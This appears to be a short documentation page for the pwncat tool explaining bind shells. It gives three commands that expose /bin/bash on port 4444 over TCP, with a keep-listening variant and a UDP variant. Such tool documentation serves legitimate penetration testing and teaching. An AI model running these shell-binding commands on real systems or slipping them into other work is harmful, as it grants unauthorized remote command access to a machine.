**********
Bind Shell
**********


.. note::

   :ref:`what_is_a_bind_shell`


TCP Bind shell
==============

Default TCP bind shell listening on ``:4444`` which behaves exactly as ``nc``.

.. code-block:: bash

   pwncat -l -e '/bin/bash' 4444


The following TCP bind shell will re-accept new clients as soon as a client has diconnected

.. code-block:: bash

   pwncat -l -e '/bin/bash' 4444 -k


UDP Bind shell
==============

Default UDP bind shell listening on ``:4444`` which behaves exactly as ``nc``.

.. code-block:: bash

   pwncat -l -e '/bin/bash' 4444 -u
